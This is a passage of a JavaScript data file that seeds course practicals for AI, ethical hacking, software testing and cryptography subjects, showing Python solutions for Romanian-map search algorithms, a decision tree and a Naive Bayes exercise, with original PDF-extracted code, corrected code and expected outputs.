import fs from 'node:fs';
import path from 'node:path';

const RMP_PY_CODE = `# Common File: RMP.py (Romanian Map Problem dataset)
dict_hn = {
    'Arad': 336, 'Bucharest': 0, 'Craiova': 160, 'Drobeta': 242, 'Eforie': 161,
    'Fagaras': 176, 'Giurgiu': 77, 'Hirsova': 151, 'Iasi': 226, 'Lugoj': 244,
    'Mehadia': 241, 'Neamt': 234, 'Oradea': 380, 'Pitesti': 100, 'Rimnicu': 193,
    'Sibiu': 253, 'Timisoara': 329, 'Urziceni': 80, 'Vaslui': 199, 'Zerind': 374
}

dict_gn = dict(
    Arad=dict(Zerind=75, Timisoara=118, Sibiu=140),
    Bucharest=dict(Urziceni=85, Giurgiu=90, Pitesti=101, Fagaras=211),
    Craiova=dict(Drobeta=120, Pitesti=138, Rimnicu=146),
    Drobeta=dict(Mehadia=75, Craiova=120),
    Eforie=dict(Hirsova=86),
    Fagaras=dict(Sibiu=99, Bucharest=211),
    Giurgiu=dict(Bucharest=90),
    Hirsova=dict(Eforie=86, Urziceni=98),
    Iasi=dict(Neamt=87, Vaslui=92),
    Lugoj=dict(Mehadia=70, Timisoara=111),
    Mehadia=dict(Lugoj=70, Drobeta=75),
    Neamt=dict(Iasi=87),
    Oradea=dict(Zerind=71, Sibiu=151),
    Pitesti=dict(Rimnicu=97, Bucharest=101, Craiova=138),
    Rimnicu=dict(Sibiu=80, Pitesti=97, Craiova=146),
    Sibiu=dict(Rimnicu=80, Fagaras=99, Arad=140, Oradea=151),
    Timisoara=dict(Lugoj=111, Arad=118),
    Urziceni=dict(Bucharest=85, Hirsova=98, Vaslui=142),
    Vaslui=dict(Iasi=92, Urziceni=142),
    Zerind=dict(Oradea=71, Arad=75)
)`;

const RWP_PY_CODE = `# Common File: RWP.py (Restaurant Waiting Problem dataset)
rwp_examples = dict(
    x1=dict(Alt='Y', Bar='N', Fri='N', Hun='Y', Pat='S', Price='$$$', Rain='N', Res='Y', Type='F', Est='0-10', ans='Y'),
    x2=dict(Alt='Y', Bar='N', Fri='N', Hun='Y', Pat='F', Price='$', Rain='N', Res='N', Type='T', Est='30-60', ans='N'),
    x3=dict(Alt='N', Bar='Y', Fri='N', Hun='N', Pat='S', Price='$', Rain='N', Res='N', Type='B', Est='0-10', ans='Y'),
    x4=dict(Alt='Y', Bar='N', Fri='Y', Hun='Y', Pat='F', Price='$', Rain='Y', Res='N', Type='T', Est='10-30', ans='Y'),
    x5=dict(Alt='Y', Bar='N', Fri='Y', Hun='N', Pat='F', Price='$$$', Rain='N', Res='Y', Type='F', Est='>60', ans='N'),
    x6=dict(Alt='N', Bar='Y', Fri='N', Hun='Y', Pat='S', Price='$$', Rain='Y', Res='Y', Type='I', Est='0-10', ans='Y'),
    x7=dict(Alt='N', Bar='Y', Fri='N', Hun='N', Pat='N', Price='$', Rain='Y', Res='N', Type='B', Est='0-10', ans='N'),
    x8=dict(Alt='N', Bar='N', Fri='N', Hun='Y', Pat='S', Price='$$', Rain='Y', Res='Y', Type='T', Est='0-10', ans='Y'),
    x9=dict(Alt='N', Bar='Y', Fri='Y', Hun='N', Pat='F', Price='$', Rain='Y', Res='N', Type='B', Est='>60', ans='N'),
    x10=dict(Alt='Y', Bar='Y', Fri='Y', Hun='Y', Pat='F', Price='$$$', Rain='N', Res='Y', Type='I', Est='10-30', ans='N'),
    x11=dict(Alt='N', Bar='N', Fri='N', Hun='N', Pat='N', Price='$', Rain='N', Res='N', Type='T', Est='0-10', ans='N'),
    x12=dict(Alt='Y', Bar='Y', Fri='Y', Hun='Y', Pat='F', Price='$', Rain='N', Res='N', Type='B', Est='0-10', ans='Y')
)`;

export const subjects = [
  {
    id: '11111111-1111-4111-8111-111111111101',
    name: 'Artificial Intelligence',
    slug: 'artificial-intelligence',
    code: 'AI',
    source_pdf: 'final_AI__3f2816a9.pdf',
    total_practicals: 9,
    description: 'Uninformed and informed graph search algorithms (BFS, IDDFS, A*, RBFS) on the Romanian Map Problem, and machine learning algorithms (Decision Tree, Naive Bayes RWP, Backpropagation Neural Network, AdaBoost, Reinforcement Learning) in Python.'
  },
  {
    id: '11111111-1111-4111-8111-111111111102',
    name: 'Ethical Hacking',
    slug: 'ethical-hacking',
    code: 'EH',
    source_pdf: 'final_ethical_hacking_607197eb.pdf',
    total_practicals: 10,
    description: 'Reconnaissance, RC4 encryption with CrypTool, password hash cracking with Cain & Abel, Linux network analysis, ARP poisoning with Ettercap, Nmap port scanning, Wireshark capture, Slowloris DoS, Stored XSS, Session Impersonation, SQL Injection on DVWA, Python Keylogger, and Metasploit exploitation.'
  },
  {
    id: '11111111-1111-4111-8111-111111111103',
    name: 'Software Testing and Quality Assurance',
    slug: 'software-testing-and-quality-assurance',
    code: 'STQA',
    source_pdf: 'final_STQA_b89bf2f3.pdf',
    total_practicals: 10,
    description: 'Automated software testing using Selenium IDE test suites, Selenium RC/Server setup in Eclipse, Selenium WebDriver in Java (login automation, JXL Excel student record updates and score filtering with TestNG, webpage link counting, combo box item counting, radio/checkbox counting), and Apache JMeter load testing.'
  },
  {
    id: '11111111-1111-4111-8111-111111111104',
    name: 'Cryptography and Network Security',
    slug: 'cryptography-and-network-security',
    code: 'CNS',
    source_pdf: 'finalCNS_69f47646.pdf',
    total_practicals: 10,
    description: 'Classical ciphers (Substitution and Transposition), RSA public-key encryption (PKCS1_OAEP), MD5 Message Authentication Codes, RSA SHA-256 Digital Signatures, Diffie-Hellman key exchange, Cisco Packet Tracer IPSec configuration, SSL/TLS socket programming, OpenCV Intrusion Detection, Malware analysis with VirusTotal, and Windows Firewall rule filtering.'
  }
];

export const practicals = [
  // ============================================================================
  // SUBJECT 1: ARTIFICIAL INTELLIGENCE (9 Practicals)
  // ============================================================================
  {
    id: '22222222-2222-4222-8222-222222220101',
    source_key: 'ai-prac-01',
    subject_id: '11111111-1111-4111-8111-111111111101',
    subject_name: 'Artificial Intelligence',
    subject_slug: 'artificial-intelligence',
    practical_number: 1,
    title: 'Breadth First Search (BFS) Algorithm for Romanian Map Problem',
    original_question: 'Implement the Breadth First Search algorithm to solve a given problem.',
    programming_language: 'Python',
    corrected_code: `import queue as Q
from RMP import dict_gn

start = 'Arad'
goal = 'Bucharest'
result = ''

def BFS(city, cityq, visitedq):
    global result
    if city == start:
        result = result + ' ' + city
    for eachcity in dict_gn[city].keys():
        if eachcity == goal:
            result = result + ' ' + eachcity
            return
        if eachcity not in cityq.queue and eachcity not in visitedq.queue:
            cityq.put(eachcity)
            result = result + ' ' + eachcity
    visitedq.put(city)
    BFS(cityq.get(), cityq, visitedq)

def main():
    cityq = Q.Queue()
    visitedq = Q.Queue()
    BFS(start, cityq, visitedq)
    print("BFS Traversal from ", start, " to ", goal, " is: ")
    print(result)

main()

# ---------------------------------------------------------
${RMP_PY_CODE}`,
    original_code: `import queue as Q
fromRMP import dict_gn

start='Arad'
goal='Bucharest'
result=''

def BFS(city, cityq,
visitedq): global result
if city==start:
result=result+' '+city
for eachcity in
dict_gn[city].keys(): if
eachcity==goal:
result=result+'
'+eachcity return
if eachcity not in cityq.queue and eachcity not in visitedq.queue:
cityq.put(eachcity)
result=result+'
'+eachcity
visitedq.put(city)
BFS(cityq.get(),cityq,visi
tedq)

def main():
cityq=Q.Queue()
visitedq=Q.Queue()
BFS(start, cityq,
visitedq)
print("BFS Traversal from ",start," to ",goal,"
is: ") print(result)
main()`,
    expected_output: `BFS Traversal from  Arad  to  Bucharest  is: 
 Arad Zerind Timisoara Sibiu Oradea Lugoj Rimnicu Fagaras Mehadia Pitesti Craiova Bucharest`,
    algorithm_steps: [
      'Initialize two FIFO queues: cityq (frontier queue) and visitedq (explored queue), and set start = "Arad", goal = "Bucharest".',
      'If the current city is the start node, append it to the traversal result string.',
      'Iterate over each neighbor city in dict_gn[city].keys().',
      'If a neighbor matches the goal ("Bucharest"), append it to result and terminate the search.',
      'If a neighbor is neither in cityq.queue nor in visitedq.queue, enqueue it in cityq and append it to result.',
      'Mark the current city as visited by adding it to visitedq, then recursively call BFS with cityq.get().'
    ],
    procedure_steps: [],
    instructions: 'Requires RMP.py in the same directory containing dict_gn (Romanian map adjacency dictionary). Note: In the source PDF (page 2), Urziceni is spelled "Uriceni" under Bucharest and "Uzriceni" as a top-level key, and Pitesti is spelled "Pitestti" under Craiova; the corrected RMP.py normalizes these keys so all city lookups succeed.',
    keywords: ['bfs', 'breadth first search', 'romanian map', 'arad', 'bucharest', 'rmp.py', 'dict_gn', 'queue', 'uninformed search', 'graph traversal'],
    aliases: ['AI Practical 1', 'Breadth First Search in Python', 'BFS Arad to Bucharest'],
    source_pdf: 'final_AI__3f2816a9.pdf',
    source_pages: [1, 2, 3, 4, 5],
    verification_status: 'verified_corrected',
    review_required: false
  },
  {
    id: '22222222-2222-4222-8222-222222220102',
    source_key: 'ai-prac-02',
    subject_id: '11111111-1111-4111-8111-111111111101',
    subject_name: 'Artificial Intelligence',
    subject_slug: 'artificial-intelligence',
    practical_number: 2,
    title: 'Iterative Deepening Depth-First Search (IDDFS) Algorithm',
    original_question: 'Implement the Iterative Depth First Search algorithm to solve the same problem.',
    programming_language: 'Python',
    corrected_code: `import queue as Q
from RMP import dict_gn

start = 'Arad'
goal = 'Bucharest'
result = ''

def DLS(city, visitedstack, startlimit, endlimit):
    global result
    found = 0
    result = result + city + ' '
    visitedstack.append(city)
    if city == goal:
        return 1
    if startlimit == endlimit:
        return 0
    for eachcity in dict_gn[city].keys():
        if eachcity not in visitedstack:
            found = DLS(eachcity, visitedstack, startlimit + 1, endlimit)
            if found:
                return found

def IDDFS(city, visitedstack, endlimit):
    global result
    for i in range(0, endlimit):
        print("Searching at Limit: ", i)
        found = DLS(city, visitedstack, 0, i)
        if found:
            print("Found")
            break
        else:
            print("Not Found!")
            print(result)
            print("-----")
            result = ' '
            visitedstack = []

def main():
    visitedstack = []
    IDDFS(start, visitedstack, 9)
    print("IDDFS Traversal from ", start, " to ", goal, " is: ")
    print(result)

main()

# ---------------------------------------------------------
${RMP_PY_CODE}`,
    original_code: `import queue as Q
from RMP import dict_gn
start='Arad'
goal='Bucharest'
result=''
def DLS(city, visitedstack, startlimit,
endlimit): global result
found=0
result=result+city+' '
visitedstack.append(
city) if city==goal:
return 1
if startlimit==endlimit:
return 0
for eachcity in
dict_gn[city].keys(): if
eachcity not in
visitedstack:
found=DLS(eachcity, visitedstack, startlimit+1,
endlimit) if found:
return found
def IDDFS(city, visitedstack,
endlimit): global result
for i in range(0, endlimit):
print("Searching at Limit:
",i) found=DLS(city,
visitedstack, 0, i) if found:
print("Found
") break
else:
print("Not Found! "
print(result)
print("--- “)
result=' '
visitedstack[]
def main():
visitedstack=[]
IDDFS(start, visitedstack, 9)
print("IDDFS Traversal from ",start," to ",
goal," is: ") print(result)
main()`,
    expected_output: `Searching at Limit:  0
Not Found!
Arad 
-----
Searching at Limit:  1
Not Found!
 Arad Zerind Timisoara Sibiu 
-----
Searching at Limit:  2
Not Found!
 Arad Zerind Oradea Timisoara Lugoj Sibiu Rimnicu Fagaras 
-----
Searching at Limit:  3
Not Found!
 Arad Zerind Oradea Sibiu Timisoara Lugoj Mehadia 
-----
Searching at Limit:  4
Not Found!
 Arad Zerind Oradea Sibiu Rimnicu Fagaras Timisoara Lugoj Mehadia Drobeta 
-----
Searching at Limit:  5
Found
IDDFS Traversal from  Arad  to  Bucharest  is: 
 Arad Zerind Oradea Sibiu Rimnicu Pitesti Craiova Fagaras Bucharest`,
    algorithm_steps: [
      'Define Depth-Limited Search DLS(city, visitedstack, startlimit, endlimit) that appends the current city to result and visitedstack.',
      'If city == goal, return 1 (found). If startlimit == endlimit, return 0 (depth cutoff reached).',
      'Recursively invoke DLS for each unvisited neighbor with depth startlimit + 1.',
      'In IDDFS(city, visitedstack, endlimit), iterate depth limit i from 0 up to endlimit - 1.',
      'Call DLS(city, visitedstack, 0, i) at each depth limit. If goal is found, print "Found" and break; otherwise print "Not Found!", reset result and visitedstack, and increment depth limit.'
    ],
    procedure_steps: [],
    instructions: 'Requires RMP.py in the same directory. Conservatively fixed three syntax errors present in the source PDF on page 7: missing closing parenthesis on print("Not Found! "), invalid smart quote in print("--- “), and invalid statement visitedstack[] corrected to visitedstack = [].',
    keywords: ['iddfs', 'iterative deepening', 'depth first search', 'dls', 'depth limited search', 'arad', 'bucharest', 'rmp.py'],
    aliases: ['AI Practical 2', 'Iterative Depth First Search', 'IDDFS Python Program'],
    source_pdf: 'final_AI__3f2816a9.pdf',
    source_pages: [1, 2, 3, 6, 7, 8],
    verification_status: 'verified_corrected',
    review_required: false
  },
  {
    id: '22222222-2222-4222-8222-222222220103',
    source_key: 'ai-prac-03',
    subject_id: '11111111-1111-4111-8111-111111111101',
    subject_name: 'Artificial Intelligence',
    subject_slug: 'artificial-intelligence',
    practical_number: 3,
    title: 'A* Search Algorithm for Pathfinding',
    original_question: 'Implement the A* Search algorithm for solving a pathfinding problem.',
    programming_language: 'Python',
    corrected_code: `import queue as Q
from RMP import dict_gn
from RMP import dict_hn

start = 'Arad'
goal = 'Bucharest'
result = ''

def get_fn(citystr):
    cities = citystr.split(" , ")
    hn = gn = 0
    for ctr in range(0, len(cities) - 1):
        gn = gn + dict_gn[cities[ctr]][cities[ctr + 1]]
    hn = dict_hn[cities[len(cities) - 1]]
    return (hn + gn)

def expand(cityq):
    global result
    tot, citystr, thiscity = cityq.get()
    if thiscity == goal:
        result = citystr + " : : " + str(tot)
        return
    for cty in dict_gn[thiscity]:
        cityq.put((get_fn(citystr + " , " + cty), citystr + " , " + cty, cty))
    expand(cityq)

def main():
    cityq = Q.PriorityQueue()
    thiscity = start
    cityq.put((get_fn(start), start, thiscity))
    expand(cityq)
    print("The A* path with the total is: ")
    print(result)

main()

# ---------------------------------------------------------
${RMP_PY_CODE}`,
    original_code: `import queue as Q
from RMP import
dict_gn from RMP
import dict_hn
start='Arad'
goal='Bucharest'
result=''
def get_fn(citystr):
cities=citystr.split(" , ")
hn=gn=0
for ctr in range(0, len(cities)-1):
gn=gn+dict_gn[cities[ctr]][cities[ctr+1]]
hn=dict_hn[cities[len(cities)-
1]] return(hn+gn)
def expand(cityq):
global result
tot, citystr,
thiscity=cityq.get() if
thiscity==goal:
result=citystr+" : :
"+str(tot) return
for cty in dict_gn[thiscity]:
cityq.put((get_fn(citystr+" , "+cty), citystr+" , "+cty,
cty)) expand(cityq)
def main():
cityq=Q.PriorityQueue()
thiscity=start
cityq.put((get_fn(start),start,thiscity))
expand(cityq)
print("The A* path with the total is:
") print(result)
main()`,
    expected_output: `The A* path with the total is: 
Arad , Sibiu , Rimnicu , Pitesti , Bucharest : : 418`,
    algorithm_steps: [
      'Define evaluation function get_fn(citystr) = g(n) + h(n), where g(n) sums edge weights along the path in dict_gn and h(n) looks up the straight-line heuristic to Bucharest in dict_hn.',
      'Initialize a PriorityQueue cityq and insert the start tuple (get_fn(start), start, start).',
      'Dequeue the lowest-cost tuple (tot, citystr, thiscity) from cityq.',
      'If thiscity == goal ("Bucharest"), format result as citystr + " : : " + str(tot) and return.',
      'Otherwise, for each neighbor cty of thiscity, compute f(n) for the extended path and push into cityq, then recursively call expand(cityq).'
    ],
    procedure_steps: [],
    instructions: 'Requires RMP.py with both dict_gn (step costs) and dict_hn (straight-line heuristic to Bucharest).',
    keywords: ['a* search', 'a star', 'pathfinding', 'heuristic search', 'get_fn', 'priorityqueue', 'arad', 'bucharest', 'rmp.py', '418'],
    aliases: ['AI Practical 3', 'A Star Search Algorithm Python', 'A* Pathfinding Arad to Bucharest'],
    source_pdf: 'final_AI__3f2816a9.pdf',
    source_pages: [1, 2, 3, 9, 10],
    verification_status: 'verified_corrected',
    review_required: false
  },
  {
    id: '22222222-2222-4222-8222-222222220104',
    source_key: 'ai-prac-04',
    subject_id: '11111111-1111-4111-8111-111111111101',
    subject_name: 'Artificial Intelligence',
    subject_slug: 'artificial-intelligence',
    practical_number: 4,
    title: 'Recursive Best-First Search (RBFS) Algorithm',
    original_question: 'Implement the Recursive Best-First Search algorithm for the same problem.',
    programming_language: 'Python',
    corrected_code: `import queue as Q
from RMP import dict_gn
from RMP import dict_hn

start = 'Arad'
goal = 'Bucharest'
result = ''

def get_fn(citystr):
    cities = citystr.split(',')
    hn = gn = 0
    for ctr in range(0, len(cities) - 1):
        gn = gn + dict_gn[cities[ctr]][cities[ctr + 1]]
    hn = dict_hn[cities[len(cities) - 1]]
    return (hn + gn)

def printout(cityq):
    for i in range(0, cityq.qsize()):
        print(cityq.queue[i])

def expand(cityq):
    global result
    tot, citystr, thiscity = cityq.get()
    nexttot = 999
    if not cityq.empty():
        nexttot, nextcitystr, nextthiscity = cityq.queue[0]
    if thiscity == goal and tot < nexttot:
        result = citystr + '::' + str(tot)
        return
    print("Expanded city ------------------------------", thiscity)
    print("Second best f(n)------------------------------", nexttot)
    tempq = Q.PriorityQueue()
    for cty in dict_gn[thiscity]:
        tempq.put((get_fn(citystr + ',' + cty), citystr + ',' + cty, cty))
    for ctr in range(1, 3):
        ctrtot, ctrcitystr, ctrthiscity = tempq.get()
        if ctrtot < nexttot:
            cityq.put((ctrtot, ctrcitystr, ctrthiscity))
        else:
            cityq.put((ctrtot, citystr, thiscity))
            break
    printout(cityq)
    expand(cityq)

def main():
    cityq = Q.PriorityQueue()
    thiscity = start
    cityq.put((999, "NA", "NA"))
    cityq.put((get_fn(start), start, thiscity))
    expand(cityq)
    print(result)

main()

# ---------------------------------------------------------
${RMP_PY_CODE}`,
    original_code: `import queue as Q
from RMP import
dict_gn from RMP
import dict_hn
start='Arad'
goal='Bucharest'
result=''
def get_fn(citystr):
cities=citystr.split
(',') hn=gn=0
for ctr in range(0,len(cities)-1):
gn=gn+dict_gn[cities[ctr]][cities[ctr+1]]
hn=dict_hn[cities[len(cities)-
1]] return(hn+gn)
def printout(cityq):
for i in
range(0,cityq.qsize()):
print(cityq.queue[i])
def expand(cityq):
global result
tot,citystr,thiscity=cityq.g
et() nexttot=999
if not cityq.empty():
nexttot,nextcitystr,nextthiscity=cityq.queue[0
]
if thiscity==goal and
tot<nexttot:
result=citystr+'::'+str(tot)
return
print("Expanded city ------------------------------",thiscity)
print("Second best f(n)------------------------------",nexttot)
tempq=Q.PriorityQueu
e() for cty in
dict_gn[thiscity]:
tempq.put((get_fn(citystr+','+cty),citystr+','+c
ty,cty)) for ctr in range(1,3):
ctrtot,ctrcitystr,ctrthiscity=temp
q.get() if ctrtot<nexttot:
cityq.put((ctrtot,ctrcitystr,ctrthiscit
y)) else:
cityq.put((ctrtot,citystr,thisc
ity)) break
printout(cityq)
expand(cityq)
def main():
cityq=Q.PriorityQueue()
thiscity=start
cityq.put((999,"NA","NA
"))
cityq.put((get_fn(start),start,thiscity))
expand(cityq)
print(result)
main()`,
    expected_output: `Expanded city------------------------------ Arad
Second best f(n)------------------------------ 999
(393, 'Arad,Sibiu', 'Sibiu')
(999, 'NA', 'NA')
(447, 'Arad,Timisoara', 'Timisoara')
Expanded city------------------------------ Sibiu
Second best f(n)------------------------------ 447
(413, 'Arad,Sibiu,Rimnicu', 'Rimnicu')
(415, 'Arad,Sibiu,Fagaras', 'Fagaras')
(447, 'Arad,Timisoara', 'Timisoara')
(999, 'NA', 'NA')
Expanded city------------------------------ Rimnicu
Second best f(n)------------------------------ 415
(415, 'Arad,Sibiu,Fagaras', 'Fagaras')
(417, 'Arad,Sibiu,Rimnicu', 'Rimnicu')
(447, 'Arad,Timisoara', 'Timisoara')
(999, 'NA', 'NA')
Expanded city------------------------------ Fagaras
Second best f(n)------------------------------ 417
(417, 'Arad,Sibiu,Rimnicu', 'Rimnicu')
(450, 'Arad,Sibiu,Fagaras', 'Fagaras')
(447, 'Arad,Timisoara', 'Timisoara')
(999, 'NA', 'NA')
Expanded city------------------------------ Rimnicu
Second best f(n)------------------------------ 447
(417, 'Arad,Sibiu,Rimnicu,Pitesti', 'Pitesti')
(447, 'Arad,Timisoara', 'Timisoara')
(999, 'NA', 'NA')
(450, 'Arad,Sibiu,Fagaras', 'Fagaras')
(526, 'Arad,Sibiu,Rimnicu', 'Rimnicu')
Expanded city------------------------------ Pitesti
Second best f(n)------------------------------ 447
(418, 'Arad,Sibiu,Rimnicu,Pitesti,Bucharest', 'Bucharest')
(447, 'Arad,Timisoara', 'Timisoara')
(607, 'Arad,Sibiu,Rimnicu,Pitesti', 'Pitesti')
(526, 'Arad,Sibiu,Rimnicu', 'Rimnicu')
(450, 'Arad,Sibiu,Fagaras', 'Fagaras')
(999, 'NA', 'NA')
Arad,Sibiu,Rimnicu,Pitesti,Bucharest::418`,
    algorithm_steps: [
      'Initialize PriorityQueue cityq with a sentinel tuple (999, "NA", "NA") and the start node tuple (get_fn(start), start, start).',
      'Pop the best candidate (tot, citystr, thiscity) and inspect cityq.queue[0] to obtain the second-best f(n) bound (nexttot).',
      'If thiscity == goal and tot < nexttot, record the optimal path and cost in result and return.',
      'Expand neighbors of thiscity into a temporary PriorityQueue tempq ordered by f(n) = g(n) + h(n).',
      'Compare the top two successors in tempq against nexttot: if ctrtot < nexttot, insert the child into cityq; otherwise back up the f-value onto the current city tuple and break.'
    ],
    procedure_steps: [],
    instructions: 'Requires RMP.py in the same directory. Line-wrapped identifiers in the PDF (cityq.g et(), Q.PriorityQueu e(), ctrthiscit y) have been restored.',
    keywords: ['rbfs', 'recursive best first search', 'second best f(n)', 'informed search', 'arad', 'bucharest', 'rmp.py', 'priorityqueue'],
    aliases: ['AI Practical 4', 'RBFS Algorithm Python', 'Recursive Best First Search'],
    source_pdf: 'final_AI__3f2816a9.pdf',
    source_pages: [1, 2, 3, 11, 12],
    verification_status: 'verified_corrected',
    review_required: false
  },
  {
    id: '22222222-2222-4222-8222-222222220105',
    source_key: 'ai-prac-05',
    subject_id: '11111111-1111-4111-8111-111111111101',
    subject_name: 'Artificial Intelligence',
    subject_slug: 'artificial-intelligence',
    practical_number: 5,
    title: 'Decision-Tree Learning Algorithm (Balance Scale Dataset)',
    original_question: 'Implement Decision-Tree learning algorithm.',
    programming_language: 'Python',
    corrected_code: `import numpy as np
import pandas as pd
import sklearn as sk
from sklearn.metrics import confusion_matrix
from sklearn.model_selection import train_test_split
from sklearn.tree import DecisionTreeClassifier
from sklearn.metrics import accuracy_score
from sklearn.metrics import classification_report

# Function importing dataset
def importdata():
    balance_data = pd.read_csv("P5-balance-scale.data")
    # Print the dataset shape
    print("Dataset Length : ", len(balance_data))
    # Printing the dataset observations
    print("Dataset : ", balance_data.head())
    return balance_data

# Function to split the dataset
def splitdataset(balance_data):
    # Separating the target variable
    X = balance_data.values[:, 1:5]
    Y = balance_data.values[:, 0]
    # Splitting the dataset into train and test
    X_train, X_test, y_train, y_test = train_test_split(
        X, Y, test_size=0.3, random_state=100
    )
    return X, Y, X_train, X_test, y_train, y_test

# Function to perform training with entropy
def train_using_entropy(X_train, X_test, y_train, y_test):
    # Decision tree with entropy
    clf_entropy = DecisionTreeClassifier(
        criterion="entropy", random_state=100, max_depth=3, min_samples_leaf=5
    )
    # Performing training
    clf_entropy.fit(X_train, y_train)
    return clf_entropy

# Function to make predictions
def prediction(X_test, clf_object):
    y_pred = clf_object.predict(X_test)
    print("Predicted Values : ")
    print(y_pred)
    return y_pred

# Function to calculate accuracy
def cal_accuracy(y_test, y_pred):
    print("Accuracy : ", accuracy_score(y_test, y_pred) * 100)

def main():
    data = importdata()
    X, Y, X_train, X_test, y_train, y_test = splitdataset(data)
    clf_entropy = train_using_entropy(X_train, X_test, y_train, y_test)
    print("Results using entropy : ")
    y_pred_entropy = prediction(X_test, clf_entropy)
    cal_accuracy(y_test, y_pred_entropy)

main()`,
    original_code: `import numpy as
np import
pandas as pd
import sklearn
as sk
from sklearn.metrics import confusion_matrix
from sklearn.model_selection import
train_test_split from sklearn.tree import
DecisionTreeClassifier from
sklearn.metrics import accuracy_score
from sklearn.metrics import
classification_report #func importing
dataset
def importdata():
balance_data=pd.read_csv("P5-balance-
scale.data") #print the dataset shape
print("Dataset Length : ",len(balance_data))
#printing the dataset observations
print("Dataset :
",balance_data.head()) return
balance_data
#func to split the dataset
def splitdataset(balance_data):
#seperating the target
variable
X=balance_data.values[:
,1:5]
Y=balance_data.values[
:,0]
#splitting the dataset into train and test
X_train,X_test,y_train,y_test=train_test_split(X,Y,test_size=0.3,random_
state=100) return X,Y,X_train,X_test,y_train,y_test
#function to perform training with entropy
def
train_using_entropy(X_train,X_test,y_train,y_te
st): #decision tree with entropy
clf_entropy=DecisionTreeClassifier(criterion="entropy",random_state=100,max_depth=3,min_samp
les_leaf=
5)
#performing training
clf_entropy.fit(X_train,y_
train) return clf_entropy
def
prediction(X_test,clf_object):
y_pred=clf_object.predict(X_t
est) print("Predicted Values :
") print(y_pred)
return y_pred
def cal_accuracy(y_test,y_pred):
print("Accuracy : ",accuracy_score(y_test,y_pred)*100)
def main():
data=importdata(
)
X,Y,X_train,X_test,y_train,y_test=splitdataset(data)
clf_entropy=train_using_entropy(X_train,X_test,y_train
,y_test) print("Results using entropy : ")
y_pred_entropy=prediction(X_test,clf_entropy)
cal_accuracy(y_test,y_pred_entropy)
main()`,
    expected_output: `Dataset Length :  624
Dataset :     B  1  1.1  1.2  1.3
0  R  1    1    1    2
1  R  1    1    1    3
2  R  1    1    1    4
3  R  1    1    1    5
4  R  1    1    2    1
Results using entropy : 
Predicted Values : 
['R' 'L' 'R' 'L' 'L' 'L' 'L' 'R' 'R' 'R' 'L' 'L' 'R' 'R' 'R' 'L' 'L'
 'R' 'R' 'L' 'R' 'R' 'L' 'R' 'R' 'R' 'R' 'L' 'L' 'L' 'R' 'L' 'R' 'R'
 'R' 'L' 'R' 'L' 'L' 'L' 'R' 'L' 'R' 'R' 'R' 'R' 'L' 'R' 'R' 'R' 'R'
 'R' 'R' 'R' 'R' 'L' 'L' 'R' 'L' 'R' 'L' 'L' 'R' 'R' 'R' 'L' 'R' 'L'
 'R' 'L' 'L' 'R' 'L' 'R' 'R' 'R' 'R' 'L' 'L' 'R' 'R' 'R' 'L' 'R' 'L'
 'R' 'R' 'L' 'L' 'R' 'R' 'R' 'L' 'L' 'R' 'L' 'L' 'L' 'R' 'L' 'R' 'R'
 'L' 'L' 'R' 'R' 'R' 'R' 'L' 'R' 'R' 'R' 'R' 'R' 'L' 'R' 'R' 'L' 'L'
 'R' 'L' 'R' 'R' 'L' 'R' 'L' 'L' 'R' 'R' 'R' 'R' 'R' 'L' 'R' 'R' 'R'
 'R' 'L' 'R' 'L' 'L' 'R' 'R' 'R' 'L' 'R' 'L' 'R' 'L' 'R' 'L' 'R' 'L'
 'R' 'L' 'R' 'R' 'R' 'R' 'R' 'R' 'R' 'L' 'R' 'R' 'R' 'L' 'L' 'R' 'R'
 'R' 'R' 'R' 'L' 'R' 'L' 'R' 'R']
Accuracy :  66.48936170212765`,
    algorithm_steps: [
      'Load P5-balance-scale.data using pandas.read_csv() and inspect its length and first 5 rows.',
      'Separate feature columns X = balance_data.values[:, 1:5] and target class column Y = balance_data.values[:, 0] (B, L, or R).',
      'Split X and Y into 70% training and 30% testing sets using train_test_split(X, Y, test_size=0.3, random_state=100).',
      'Instantiate DecisionTreeClassifier(criterion="entropy", random_state=100, max_depth=3, min_samples_leaf=5) and fit on (X_train, y_train).',
      'Predict class labels on X_test and compute classification accuracy using accuracy_score(y_test, y_pred) * 100.'
    ],
    procedure_steps: [],
    instructions: 'Requires P5-balance-scale.data (UCI Balance Scale dataset, 625 rows; pages 15–19 of the PDF list the CSV rows starting with B,1,1,1,1) and Python packages: pip install numpy pandas scipy scikit-learn.',
    keywords: ['decision tree', 'entropy', 'scikit-learn', 'sklearn', 'balance-scale.data', 'decisiontreeclassifier', 'train_test_split', 'accuracy_score', 'classification'],
    aliases: ['AI Practical 5', 'Decision Tree Learning Algorithm Python', 'Balance Scale Decision Tree'],
    source_pdf: 'final_AI__3f2816a9.pdf',
    source_pages: [1, 13, 14, 15, 16, 17, 18, 19],
    verification_status: 'verified_corrected',
    review_required: false
  },
  {
    id: '22222222-2222-4222-8222-222222220106',
    source_key: 'ai-prac-06',
    subject_id: '11111111-1111-4111-8111-111111111101',
    subject_name: 'Artificial Intelligence',
    subject_slug: 'artificial-intelligence',
    practical_number: 6,
    title: 'Naive-Bayes Learning Algorithm for Restaurant Waiting Problem (RWP)',
    original_question: 'Implement Naive-Bayes learning algo for RWP (Restaurant Waiting Problem).',
    programming_language: 'Python',
    corrected_code: `from RWP import rwp_examples

total_exp = 12

def tot(attribute, value):
    count = 0
    for key, val in rwp_examples.items():
        for key1, val1 in val.items():
            if key1 == attribute:
                if val1 == value:
                    count += 1
    return count

def getProbab(attribute, attribval, value):
    count = 0
    for key, val in rwp_examples.items():
        val1 = rwp_examples[key][attribute]
        val2 = rwp_examples[key]['ans']
        if val1 == attribval and val2 == value:
            count += 1
    probab = count / tot('ans', value)
    return probab

def main():
    PAltYes = tot('Alt', 'Y') / total_exp
    PAltNo = tot('Alt', 'N') / total_exp
    PBarYes = tot('Bar', 'Y') / total_exp
    PBarNo = tot('Bar', 'N') / total_exp
    PFriYes = tot('Fri', 'Y') / total_exp
    PFriNo = tot('Fri', 'N') / total_exp
    PHunYes = tot('Hun', 'Y') / total_exp
    PHunNo = tot('Hun', 'N') / total_exp
    PPatSome = tot('Pat', 'S') / total_exp
    PPatFull = tot('Pat', 'F') / total_exp
    PPatNone = tot('Pat', 'N') / total_exp
    PPriceCheap = tot('Price', '$') / total_exp
    PPriceAvg = tot('Price', '$$') / total_exp
    PPriceExp = tot('Price', '$$$') / total_exp
    PRainYes = tot('Rain', 'Y') / total_exp
    PRainNo = tot('Rain', 'N') / total_exp
    PResYes = tot('Res', 'Y') / total_exp
    PResNo = tot('Res', 'N') / total_exp
